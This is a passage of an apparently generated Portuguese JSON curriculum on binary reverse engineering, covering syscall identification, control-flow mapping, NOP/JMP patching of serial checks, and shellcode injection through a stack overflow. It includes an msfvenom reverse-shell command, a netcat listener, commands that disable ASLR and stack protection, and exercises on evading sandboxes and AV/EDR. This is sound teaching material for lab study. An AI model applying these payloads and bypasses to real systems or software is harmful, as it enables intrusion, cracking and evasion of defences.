                                  "materials": "Ghidra com PE loader, CFF Explorer, exemplo PE de VirusTotal ou compilado com MinGW.",
                                  "tips": "Ative cross-references em IDA/Ghidra para ver todos os callers de uma API.",
                                  "learningObjective": "Identificar e dissecar imports de APIs em PE para análise de comportamento.",
                                  "commonMistakes": "Ignorar exports vs imports; não checar ordinal imports (sem nome)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Entender Parâmetros, Retornos e Preparar para Patching",
                                  "subSteps": [
                                    "Para cada syscall/API encontrada, documente signature completa (params tipos/tamanhos, retorno).",
                                    "Simule execução: use debugger (GDB/WinDbg) para stepar até a chamada e inspecionar registradores/memória.",
                                    "Planeje patch: ex: NOP syscall para bloquear, ou redirect para logger.",
                                    "Teste em ambiente sandbox: altere binário com hex editor ou radare2 e execute.",
                                    "Valide: compare before/after com strace (Linux) ou API Monitor (Windows)."
                                  ],
                                  "verification": "Crie um patch simples em um binário teste e demonstre que a syscall/API foi neutralizada.",
                                  "estimatedTime": "90 minutos",
                                  "materials": "GDB/WinDbg, radare2 ou x64dbg, strace/ProcMon, binários desarmados para teste.",
                                  "tips": "Salve backups antes de patching; use 'sc sc' no GDB para skip calls.",
                                  "learningObjective": "Analisar dinamicamente params/retornos e aplicar conhecimentos em modificações.",
                                  "commonMistakes": "Buffer overflow em params manuais; não alinhar stack pós-patch."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Praticar em Cenários Complexos e Integrar Conhecimentos",
                                  "subSteps": [
                                    "Analise malware sample com syscalls ofuscadas (ex: CTF challenge).",
                                    "Encontre chamadas indiretas: lea rax, [reloc_syscall] + syscall.",
                                    "Compare multi-arquitetura: ARM syscalls vs x86.",
                                    "Documente relatório: fluxograma de chamadas identificadas.",
                                    "Exercício: patch para bypass sandbox detection via API hooks."
                                  ],
                                  "verification": "Produza relatório com 3 exemplos analisados, incluindo patches funcionais.",
                                  "estimatedTime": "120 minutos",
                                  "materials": "Samples de MalwareBazaar (seguro), CTF bins (ex: picoCTF), relocatable disassembler.",
                                  "tips": "Use FLIRT signatures em IDA para auto-identificar APIs.",
                                  "learningObjective": "Aplicar identificação em binários reais e complexos para engenharia reversa avançada.",
                                  "commonMistakes": "Sobrestimar ofuscação simples; não testar patches em VM isolada."
                                }
                              ],
                              "practicalExample": "Em um binário ELF malicioso, localize 'syscall' com rax=59 (execve), params em rdi/rsi/rdx; patch para int3 (breakpoint) e debugue com GDB para confirmar bloqueio de execução de shell.",
                              "finalVerifications": [
                                "Localiza corretamente int 0x80/syscall em ELF e call WriteFile em PE.",
                                "Explica params/retornos para pelo menos 5 syscalls/APIs comuns.",
                                "Disassembla e anota fluxo completo de uma chamada em ferramenta escolhida.",
                                "Aplica patch simples que altera comportamento sem crash.",
                                "Usa strace/ProcMon para validar análise estática/dinâmica.",
                                "Identifica chamadas indiretas ou ofuscadas em sample complexo."
                              ],
                              "assessmentCriteria": [
                                "Precisão na localização de syscalls (100% em exemplos básicos).",
                                "Compreensão profunda de params/retornos (sem erros em signatures).",
                                "Qualidade de disassembly e anotações (claras e completas).",
                                "Sucesso em patching (funciona em pelo menos 80% dos testes).",
                                "Integração com debugging (evidências de execução passo-a-passo).",
                                "Relatório estruturado com fluxogramas ou screenshots."
                              ],
                              "crossCurricularConnections": [
                                "Assembly e Arquitetura de Computadores: registradores e convenções de chamada.",
                                "Sistemas Operacionais: kernel interfaces e tabelas de syscalls.",
                                "Análise de Malware: detecção de behaviors via API monitoring.",
                                "Debugging e Ferramentas: GDB/WinDbg para validação dinâmica.",
                                "Programação em C: simulação de chamadas para testes."
                              ],
                              "realWorldApplication": "Em segurança cibernética, identificar syscalls/APIs permite análise de malware (ex: ransomware usando CreateFile), criação de hooks para EDR, patching de exploits em pentests, e auditoria de binários proprietários para vazamentos de dados."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.3.2.3",
                            "name": "Analisar controle de fluxo",
                            "description": "Mapear branches condicionais (JE, JNE) e loops, identificando oportunidades para NOP sleds ou redirecionamentos de fluxo.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Realizar Disassembly e Identificar Blocos Básicos de Controle de Fluxo",
                                  "subSteps": [
                                    "Carregue o binário em uma ferramenta de disassembly como Ghidra ou IDA Pro.",
                                    "Navegue pelo código assembly e identifique funções principais usando cross-references.",
                                    "Marque blocos básicos (sequências lineares terminadas por jumps ou calls).",
                                    "Gere um grafo de fluxo de controle para visualizar entradas e saídas.",
                                    "Anote endereços iniciais de potenciais branches e loops."
                                  ],
                                  "verification": "Grafo de fluxo de controle gerado com blocos básicos claramente delimitados e anotados.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Ferramenta de disassembly (Ghidra/IDA Pro), binário de exemplo com controle de fluxo conhecido.",
                                  "tips": "Ative a visão de grafo para uma representação visual intuitiva do fluxo.",
                                  "learningObjective": "Compreender a estrutura básica de blocos de código em assembly disassemblado.",
                                  "commonMistakes": "Confundir calls com jumps condicionais ou ignorar blocos aninhados."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Mapear Branches Condicionais (JE, JNE, JZ, etc.)",
                                  "subSteps": [
                                    "Procure instruções de jump condicional como JE (Jump if Equal), JNE (Jump if Not Equal), JZ (Jump if Zero).",
                                    "Trace os caminhos de 'true' e 'false' para cada branch, anotando condições de flag (ZF, CF).",
                                    "Identifique dependências de registradores (ex: CMP antes de JE).",
                                    "Registre endereços de destino e origens em uma tabela.",
                                    "Simule execução manual para validar caminhos lógicos."
                                  ],
                                  "verification": "Tabela completa de branches com caminhos true/false mapeados e condições anotadas.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Ferramenta de disassembly, debugger (x64dbg ou GDB), tabela em spreadsheet.",
                                  "tips": "Use breakpoints no debugger para pausar em jumps e inspecionar flags.",
                                  "learningObjective": "Mapear precisamente estruturas condicionais if-else em assembly.",
                                  "commonMistakes": "Interpretar incorretamente flags de CPU ou pular branches aninhadas."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Loops e Estruturas Iterativas",
                                  "subSteps": [
                                    "Identifique loops por padrões como JMP de volta, JB/JA para contadores.",
                                    "Determine condições de entrada/saída (ex: LOOP, JNZ com decremento).",
                                    "Calcule número aproximado de iterações baseado em registradores (ECX, contadores).",
                                    "Marque pontos de vulnerabilidade como overflows em loops.",
                                    "Trace interações com branches dentro do loop."
                                  ],
                                  "verification": "Diagrama de loops com condições de parada e iterações estimadas documentado.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Ferramenta de disassembly, debugger para stepping através do loop.",
                                  "tips": "Execute o binário em modo step-by-step para observar mudanças em registradores.",
                                  "learningObjective": "Reconhecer e analisar estruturas de repetição em código binário.",
                                  "commonMistakes": "Confundir loops infinitos com branches simples ou ignorar condições de saída."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar Oportunidades para NOP Sleds e Redirecionamentos de Fluxo",
                                  "subSteps": [
                                    "Avalie branches para pontos de injeção: ex: após overflow antes de JE/JNE.",
                                    "Proponha inserção de NOP sled (sequência de NOPs) para alinhar shellcode.",
                                    "Sugira redirecionamentos: alterar destino de jump para endereço controlado.",
                                    "Simule patching com NOPs ou JMP absoluto em um binário copiado.",
                                    "Verifique impacto no fluxo geral com re-disassembly."
                                  ],
                                  "verification": "Relatório com 2-3 oportunidades identificadas, incluindo endereços e simulação de patch.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Hex editor (HxD), ferramenta de patching (como radare2), binário mutável.",
                                  "tips": "Teste em ambiente virtualizado para evitar crashes reais.",
                                  "learningObjective": "Detectar e explorar fraquezas em controle de fluxo para modificações.",
                                  "commonMistakes": "Subestimar alinhamento de endereços ou ignorar proteções ASLR/DEP."
                                }
                              ],
                              "practicalExample": "Em um binário de verificação de senha simples (ex: strcmp com buffer local), identifique JE após CMP: se overflow no buffer, insira NOP sled antes do JE para deslizar até shellcode em um JMP redirecionado para endereço de buffer, permitindo bypass da autenticação.",
                              "finalVerifications": [
                                "Mapa completo de branches e loops gerado sem erros.",
                                "Condições de flags corretamente associadas a cada jump.",
                                "Pelo menos duas oportunidades de NOP sled ou redirecionamento identificadas.",
                                "Simulação de patching executada com sucesso em binário de teste.",
                                "Grafo de fluxo modificado reflete as alterações propostas.",
                                "Relatório documenta impactos potenciais em segurança."
                              ],
                              "assessmentCriteria": [
                                "Precisão no mapeamento de 100% das branches e loops.",
                                "Qualidade dos substeps: detalhados e sequenciais.",
                                "Criatividade e viabilidade nas oportunidades de exploração.",
                                "Uso correto de ferramentas e verificações manuais.",
                                "Documentação clara com diagramas e tabelas.",
                                "Compreensão demonstrada em simulações de patching."
                              ],
                              "crossCurricularConnections": [
                                "Algoritmos e Estruturas de Dados (análise de grafos de fluxo).",
                                "Programação em Linguagem Assembly (instruções de jump).",
                                "Arquitetura de Computadores (flags de CPU e registradores).",
                                "Criptografia e Segurança (ataques de controle de fluxo em binários).",
                                "Engenharia de Software (debugging e patching)."
                              ],
                              "realWorldApplication": "Na análise de malware, mapeia fluxos evasivos para detecção; em pentesting, identifica pontos para exploits de buffer overflow com ROP chains ou NOP sleds em aplicações legadas sem proteções modernas."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.3.3",
                        "name": "Técnicas de Modificação e Patching",
                        "description": "Métodos práticos para alterar instruções, dados e fluxo em binários, incluindo patching de jumps, injeção de código e verificação de integridade.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.3.3.1",
                            "name": "Patching de instruções com NOP e JMP",
                            "description": "Substituir instruções por NOPs ou inserir JMPs para bypassar checks, usando debuggers como x64dbg ou GDB para testar em runtime.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Ambiente e Carregar o Binário",
                                  "subSteps": [
                                    "Instalar x64dbg (para Windows) ou GDB (para Linux) em uma máquina virtual isolada.",
                                    "Baixar um binário de teste simples, como um crackme com verificação de serial.",
                                    "Abrir o debugger e carregar o binário usando File > Open.",
                                    "Configurar opções iniciais: desabilitar ASLR se necessário e setar breakpoints em entry point.",
                                    "Executar o binário uma vez para observar comportamento normal (falha no check)."
                                  ],
                                  "verification": "Binário carregado, disassembly visível e execução inicial sem crashes.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "x64dbg ou GDB instalado",
                                    "Binário crackme.exe",
                                    "Máquina virtual (VirtualBox/VMware)"
                                  ],
                                  "tips": "Sempre use VM para evitar infecções acidentais; salve snapshots antes de patches.",
                                  "learningObjective": "Configurar um ambiente seguro para análise dinâmica de binários.",
                                  "commonMistakes": [
                                    "Executar binário host sem VM",
                                    "Esquecer de desabilitar proteções como ASLR",
                                    "Carregar binário corrompido"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Analisar a Instrução Alvo",
                                  "subSteps": [
                                    "Executar o binário até o ponto de falha (ex: input de serial incorreto).",
                                    "Usar F7/F8 para step-through e localizar jumps condicionais (JE/JNE/JZ/JNZ).",
                                    "Analisar o disassembly: identifique instruções como CMP seguido de JNZ para falha.",
                                    "Setar breakpoint na instrução suspeita e inspecionar registradores/flags.",
                                    "Documentar endereço da instrução (ex: 0x401000) e o que ela faz."
                                  ],
                                  "verification": "Endereço da instrução alvo anotado e comportamento confirmado via stepping.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Debugger aberto com binário",
                                    "Bloco de notas para endereços"
                                  ],
                                  "tips": "Procure padrões como 'test eax,eax; jz success' para checks booleanos.",
                                  "learningObjective": "Localizar precisamente pontos de controle de fluxo em código assembly.",
                                  "commonMistakes": [
                                    "Confundir jumps condicionais com incondicionais",
                                    "Não checar flags ZF/SF após CMP",
                                    "Passar direto sem stepping"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Aplicar o Patch com NOP ou JMP",
                                  "subSteps": [
                                    "Posicionar cursor na instrução alvo (ex: JNZ 0x401020).",
                                    "Para NOP: selecionar bytes da instrução e pressionar Space > Assemble > NOP (repita para cobrir bytes).",
                                    "Para JMP: pressionar Space > Assemble > 'JMP short destino' ou 'EB XX' calculando offset.",
                                    "Confirmar no disassembly: instrução substituída (ex: DB CC para int3 ou 90h para NOP).",
                                    "Reiniciar execução (F9) para testar preliminarmente."
                                  ],
                                  "verification": "Disassembly mostra NOPs/JMP no lugar da instrução original sem erros de sintaxe.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Debugger com binário pausado no alvo"
                                  ],
                                  "tips": "Calcule offset para JMP: destino - atual - 2 bytes; use 'jmp short +XX'.",
                                  "learningObjective": "Modificar instruções assembly de forma precisa usando ferramentas de patching.",
                                  "commonMistakes": [
                                    "NOP insuficiente (deixar bytes residuais)",
                                    "Offset errado em JMP causando crash",
                                    "Não alinhar bytes corretamente"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar o Patch em Runtime e Verificar Bypass",
                                  "subSteps": [
                                    "Reiniciar o programa (Ctrl+F2) e fornecer input que antes falhava.",
                                    "Stepar até o patch e confirmar que fluxo é bypassado (ex: vai para sucesso).",
                                    "Inspecionar memória/registradores para side-effects indesejados.",
                                    "Testar múltiplas vezes com variações de input para robustez.",
                                    "Usar logs ou mensagens do programa para confirmar bypass (ex: 'Valid serial')."
                                  ],
                                  "verification": "Programa passa no check bypassado sem crashes ou loops infinitos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Inputs de teste variados"
                                  ],
                                  "tips": "Monitore stack para overflows; pause em outros checks potenciais.",
                                  "learningObjective": "Validar patches dinamicamente e debugar consequências.",
                                  "commonMistakes": [
                                    "Não reiniciar após patch",
                                    "Ignorar checks subsequentes",
                                    "Testar só um input"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Salvar e Documentar o Binário Patchado",
                                  "subSteps": [
                                    "No x64dbg: Plugins > ScyllaHide > Patch file ou File > Patch file.",
                                    "Para GDB: usar 'set write on' e dump memória com 'dump binary'.",
                                    "Salvar como novo arquivo (ex: crackme_patched.exe).",
                                    "Executar o patchado fora do debugger para validação final.",
                                    "Documentar: endereços, tipo de patch, antes/depois screenshots."
                                  ],
                                  "verification": "Binário salvo executa standalone com bypass funcionando.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Ferramentas de patching no debugger"
                                  ],
                                  "tips": "Assine o binário se necessário para testes AV; version controle mudanças.",
                                  "learningObjective": "Persistir modificações em binários e documentar para reprodutibilidade.",
                                  "commonMistakes": [
                                    "Salvar sem commit patches",
                                    "Executar patchado sem AV scan",
                                    "Perder documentação de endereços"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um crackme.exe que verifica serial 'ABC123' via CMP e JNZ para 'Invalid', localize 0x401000 (JNZ fail). Substitua por NOPs nos 2 bytes (90 90) ou JMP short para success (EB 05). Teste: input qualquer passa para 'Valid Serial'.",
                              "finalVerifications": [
                                "Pode carregar e navegar binário em debugger sem crashes.",
                                "Identifica jumps condicionais em <2 minutos.",
                                "Aplica NOP/JMP corretamente em qualquer instrução de 1-6 bytes.",
                                "Valida bypass em runtime com múltiplos testes.",
                                "Salva binário funcional standalone.",
                                "Documenta patch com endereços e raciocínio."
                              ],
                              "assessmentCriteria": [
                                "Precisão na localização: 100% acerto em instruções alvo.",
                                "Corretude do patch: bypass sem side-effects ou crashes.",
                                "Eficiência temporal: completa em <90 minutos.",
                                "Documentação completa: inclui screenshots e explicações.",
                                "Adaptabilidade: aplica a diferentes binários/archs.",
                                "Segurança: usa VM e isola testes."
                              ],
                              "crossCurricularConnections": [
                                "Linguagem Assembly: compreensão de opcodes e flags.",
                                "Análise de Malware: técnicas similares para desarmar payloads.",
                                "Programação de Baixo Nível: debugging e manipulação de memória.",
                                "Criptografia: bypass de checks de autenticação.",
                                "Desenvolvimento de Software: patching para hotfixes."
                              ],
                              "realWorldApplication": "Engenharia reversa de malware para neutralização (ex: patchar chamadas de C2), análise de vulnerabilidades em software proprietário, criação de cracks educacionais para CTFs, ou modificação de jogos antigos para compatibilidade moderna."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.3.3.2",
                            "name": "Injeção de shellcode simples",
                            "description": "Criar e inserir shellcodes em buffers overflow ou seções vazias, garantindo execução via modificação de retornos (ROP básico).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Gerar um Shellcode Simples",
                                  "subSteps": [
                                    "Estude shellcodes básicos como execve(/bin/sh) para arquitetura x86/x64.",
                                    "Use ferramentas como msfvenom ou msfconsole para gerar shellcode: msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o shellcode.bin.",
                                    "Converta o shellcode para formato legível (hex ou C array) usando xxdc ou Python.",
                                    "Teste o shellcode standalone em um ambiente isolado com um loader simples.",
                                    "Otimize o shellcode removendo null bytes se necessário com técnicas de encoding."
                                  ],
                                  "verification": "Execute o shellcode em um debugger como GDB e confirme que abre uma shell ou conecta reverse.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Metasploit Framework (msfvenom)",
                                    "GDB ou pwndbg",
                                    "Python para parsing",
                                    "Ambiente Linux x64 virtualizado"
                                  ],
                                  "tips": "Sempre gere shellcode position-independent (PIC) para evitar dependências de endereço.",
                                  "learningObjective": "Compreender a estrutura e geração de shellcodes executáveis independentes.",
                                  "commonMistakes": [
                                    "Incluir null bytes que terminam strings",
                                    "Não testar em ASLR/DEP desabilitado",
                                    "Usar shellcode para arquitetura errada"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Vulnerabilidade e Local de Injeção",
                                  "subSteps": [
                                    "Compile um binário vulnerável em C com buffer overflow: use strcpy sem bounds check.",
                                    "Desabilite proteções: gcc -fno-stack-protector -z execstack -no-pie vulnerable.c -o vuln.",
                                    "Use GDB para encontrar offset do overflow: cyclic pattern com pwntools ou gdb-peda.",
                                    "Identifique endereço de buffer ou seção vazia (.bss) via objdump ou readelf.",
                                    "Confirme controle de EIP/Retorno com payload de 4 bytes no offset correto."
                                  ],
                                  "verification": "Input no offset exato sobe EIP para um endereço controlado, visível no GDB.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "GCC compiler",
                                    "GDB com pwndbg/gef",
                                    "pwntools para cyclic",
                                    "objdump/readelf"
                                  ],
                                  "tips": "Use checksec.sh para verificar proteções e desabilitá-las inicialmente.",
                                  "learningObjective": "Localizar precisamente pontos de injeção em binários vulneráveis.",
                                  "commonMistakes": [
                                    "Esquecer ASLR: echo 0 > /proc/sys/kernel/randomize_va_space",
                                    "Offset incorreto por alinhamento stack",
                                    "Ignorar canary se stack protector ativo"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Construir Payload com Injeção de Shellcode e ROP Básico",
                                  "subSteps": [
                                    "Preencha buffer com NOP sled (0x90) antes do shellcode para landing zone.",
                                    "Anexe shellcode ao final do buffer: padding + shellcode + return address para início do NOP sled.",
                                    "Para seções vazias: use ROP para jmp esp ou ret2libc básico se DEP ativo.",
                                    "Calcule endereço absoluto do buffer/NOP com gdb: info proc mappings ou pattern_offset.",
                                    "Encode payload para evitar bad chars usando msfvenom -b '\\x00\\x0a'."
                                  ],
                                  "verification": "Examine payload em hex editor ou Python struct.pack para confirmar estrutura.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Python/pwntools para crafting",
                                    "Hex editor (xxd)",
                                    "GDB para endereços"
                                  ],
                                  "tips": "NOP sled de 100+ bytes aumenta taxa de sucesso em endereços imprecisos.",
                                  "learningObjective": "Montar payloads que injetem e redirecionem execução para shellcode.",
                                  "commonMistakes": [
                                    "Endereço de retorno aponta para meio do shellcode",
                                    "Bad chars filtrados pelo input",
                                    "Falta de alinhamento (add esp, offset)"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Executar Injeção, Depurar e Verificar Execução",
                                  "subSteps": [
                                    "Injete payload via stdin ou args: python -c 'print payload' | ./vuln.",
                                    "Anexe GDB: gdb -q ./vuln, set args payload, run e stepi no EIP.",
                                    "Monitore com netcat para reverse shell: nc -lvnp 4444.",
                                    "Depure crashes: examine registers/stack com x/50wx $esp.",
                                    "Automatize com pwntools script para envio e interação."
                                  ],
                                  "verification": "Shellcode executa: obtém shell interativa ou reverse connect sem crash.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Netcat (nc)",
                                    "pwntools scripts",
                                    "GDB avançado"
                                  ],
                                  "tips": "Use gef-pwndbg para visualização stack/rop melhor.",
                                  "learningObjective": "Executar e depurar injeções de shellcode com sucesso.",
                                  "commonMistakes": [
                                    "ASLR/DEP não desabilitado",
                                    "Firewall bloqueia reverse",
                                    "Shellcode não nul-terminated"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário C vulnerável com strcpy(buffer), encontre offset 112, injete NOP sled + shellcode execve(/bin/sh) + ret para NOP. Execute: python payload.py | ./vuln, obtenha shell root na VM isolada.",
                              "finalVerifications": [
                                "Shellcode executa sem crash, spawnando shell interativa.",
                                "EIP/Ret redirecionado corretamente para shellcode via GDB.",
                                "Reverse shell conecta a listener nc sem interrupções.",
                                "Payload injetado em buffer overflow ou .bss sem corrupção.",
                                "Nenhum bad char altera o payload durante input.",
                                "Execução funciona em ambiente com ASLR off inicialmente."
                              ],
                              "assessmentCriteria": [
                                "Shellcode gerado é position-independent e livre de null bytes.",
                                "Offset de overflow calculado com precisão <5 bytes erro.",
                                "Payload inclui NOP sled e ROP básico funcional.",
                                "Execução bem-sucedida em 3/5 tentativas manuais.",
                                "Relatório de depuração explica registers e stack changes.",
                                "Script pwntools automatiza injeção com sucesso."
                              ],
                              "crossCurricularConnections": [
                                "Assembly (x86/x64) para entender shellcode opcodes.",
                                "Programação C para criar/explorar vulnerabilidades buffer.",
                                "Sistemas Operacionais para execve e privilégios.",
                                "Redes para reverse shells e listeners.",
                                "Criptografia para encoding shellcodes evasivos."
                              ],
                              "realWorldApplication": "Em pentesting ético (CTFs, bug bounties), demonstrar exploits para relatar vulnerabilidades em software legado, ou em desenvolvimento seguro para hardening contra buffer overflows."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.3.3.3",
                            "name": "Testar e validar patches",
                            "description": "Executar binários patchados em ambientes controlados (VMs), usando strace/wireshark para verificar comportamento e depurar crashes.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente Controlado em VM",
                                  "subSteps": [
                                    "Instalar e configurar uma máquina virtual (ex: VirtualBox ou VMware) com SO Linux (Ubuntu/Debian).",
                                    "Instalar ferramentas essenciais: strace, wireshark, gdb.",
                                    "Copiar o binário patchado para a VM e criar snapshots para rollback.",
                                    "Configurar rede bridged ou NAT para capturar tráfego adequadamente.",
                                    "Testar execução básica do binário original para baseline."
                                  ],
                                  "verification": "VM rodando, ferramentas instaladas (ver `strace --version`, `wireshark --version`), binário executável sem erros iniciais.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "VirtualBox/VMware",
                                    "ISO Ubuntu",
                                    "strace, wireshark, gdb pacotes",
                                    "Binário patchado"
                                  ],
                                  "tips": "Use snapshots antes de qualquer teste para facilitar reversões rápidas.",
                                  "learningObjective": "Preparar um ambiente isolado e reproduzível para testes de binários maliciosos ou modificados.",
                                  "commonMistakes": [
                                    "Executar em host principal (risco de contaminação)",
                                    "Esquecer de instalar dependências do binário",
                                    "Configurar rede incorreta impedindo captura de pacotes"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Executar Binário Patchado com Strace para Monitorar Chamadas de Sistema",
                                  "subSteps": [
                                    "Executar o binário com `strace -o trace.log ./patched_binary [args]` capturando todas as syscalls.",
                                    "Comparar trace.log com execução do binário original.",
                                    "Identificar syscalls alteradas pelo patch (ex: open, connect, execve).",
                                    "Analisar timestamps e retornos de syscalls para anomalias.",
                                    "Repetir com opções avançadas como `-e trace=network` para foco."
                                  ],
                                  "verification": "Arquivo trace.log gerado com syscalls esperadas alteradas pelo patch visíveis.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "strace instalado",
                                    "Binário patchado e original"
                                  ],
                                  "tips": "Use `strace -tt -f` para fork/exec e timestamps precisos.",
                                  "learningObjective": "Monitorar e interpretar chamadas de sistema para validar mudanças no comportamento do binário.",
                                  "commonMistakes": [
                                    "Não usar -f para processos filhos",
                                    "Ignorar retornos de erro nas syscalls",
                                    "Sobrecarregar logs sem filtros"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Capturar e Analisar Tráfego de Rede com Wireshark",
                                  "subSteps": [
                                    "Iniciar captura no Wireshark na interface de rede da VM (`sudo wireshark`).",
                                    "Executar o binário patchado e reproduzir cenários de rede.",
                                    "Aplicar filtros (ex: `ip.dst == target_ip` ou `tcp.port == 443`).",
                                    "Analisar pacotes para payloads alterados ou conexões bloqueadas pelo patch.",
                                    "Exportar relatórios e correlacionar com strace logs."
                                  ],
                                  "verification": "Captura mostra tráfego esperado/modificado, sem vazamentos não intencionais.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Wireshark instalado",
                                    "Rede configurada na VM"
                                  ],
                                  "tips": "Salve capturas em pcap para análise posterior com tshark.",
                                  "learningObjective": "Detectar e validar alterações em comunicações de rede causadas pelo patch.",
                                  "commonMistakes": [
                                    "Capturar tráfego irrelevante sem filtros",
                                    "Executar sem privilégios sudo",
                                    "Não correlacionar com strace"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Depurar Crashes e Validar Funcionalidade do Patch",
                                  "subSteps": [
                                    "Se crash ocorrer, anexar gdb: `gdb ./patched_binary core` ou `gdb -p <pid>`.",
                                    "Analisar stack trace, registers e memória para causa do crash.",
                                    "Corrigir patch se necessário (ex: NOPs, jumps) e retestar.",
                                    "Executar testes funcionais: verificar se bypass/funcionalidade patchada opera como esperado.",
                                    "Documentar resultados em relatório com evidências."
                                  ],
                                  "verification": "Binário executa sem crashes, comportamento patchado confirmado via logs e outputs.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "gdb instalado",
                                    "Core dumps habilitados (`ulimit -c unlimited`)"
                                  ],
                                  "tips": "Habilite ASLR off (`echo 0 > /proc/sys/kernel/randomize_va_space`) para debugging consistente.",
                                  "learningObjective": "Diagnosticar e resolver falhas em binários patchados, confirmando eficácia.",
                                  "commonMistakes": [
                                    "Não gerar core dumps",
                                    "Ignorar alinhamento de instruções em patches",
                                    "Testar apenas uma vez sem repetições"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Realizar Validação Final e Cleanup",
                                  "subSteps": [
                                    "Executar suíte de testes automatizados (script bash com strace/wireshark).",
                                    "Comparar métricas: tempo de execução, syscalls únicas, tráfego enviado.",
                                    "Verificar persistência do patch em diferentes inputs/ambientes.",
                                    "Limpar VM: restaurar snapshot e documentar lições aprendidas.",
                                    "Preparar relatório com screenshots de logs chave."
                                  ],
                                  "verification": "Relatório completo confirma patch validado em todos cenários.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Script de teste bash",
                                    "Templates de relatório"
                                  ],
                                  "tips": "Automatize comparações com `diff` em logs.",
                                  "learningObjective": "Consolidar testes em validação holística e documentação profissional.",
                                  "commonMistakes": [
                                    "Pular cleanup expondo VM",
                                    "Validação superficial sem edge cases",
                                    "Relatório sem evidências"
                                  ]
                                }
                              ],
                              "practicalExample": "Patchar um binário de malware que conecta a C2 server para bypassar o connect(). Executar em VM Ubuntu: strace mostra ausência de connect syscall, Wireshark confirma zero pacotes de saída, sem crash ao processar payloads simulados.",
                              "finalVerifications": [
                                "Binário patchado executa sem segment faults ou crashes inesperados.",
                                "Strace logs confirmam remoção/alteração de syscalls indesejadas.",
                                "Wireshark captura ausência de tráfego malicioso ou presença de comportamento esperado.",
                                "Funcionalidade core do binário preservada (ex: processa inputs corretamente).",
                                "Testes repetidos em múltiplos cenários (com/ sem args, rede up/down) passam.",
                                "Relatório documenta todas evidências com timestamps e hashes de arquivos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração e isolamento da VM (sem leaks para host).",
                                "Interpretação correta de strace (identifica 100% das syscalls alteradas).",
                                "Análise Wireshark identifica anomalias de rede com filtros apropriados.",
                                "Depuração gdb resolve crashes em <3 iterações.",
                                "Relatório abrangente com evidências visuais e métricas quantitativas.",
                                "Eficiência temporal: completa em <5 horas totais."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: compreensão de syscalls e kernel interactions.",
                                "Redes: protocolos TCP/UDP e análise de pacotes.",
                                "Programação em C/Assembly: debugging de binários e patching.",
                                "Segurança da Informação: conceitos de sandboxing e análise de malware.",
                                "Engenharia de Software: testes automatizados e relatórios."
                              ],
                              "realWorldApplication": "Em equipes de Red Team/Pentest, validar patches em exploits para CTFs ou engajamentos reais; análise de malware para detectar/behavior pós-patching em IOCs; desenvolvimento de bypasses para AV/EDR em security research."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.3.3.4",
                            "name": "Lidar com proteções anti-patching",
                            "description": "Contornar checksums, ASLR parcial ou packing básico recalculando hashes ou usando unpackers como UPX.",
                            "atomicExpansion": {
                              "steps": [
                                {
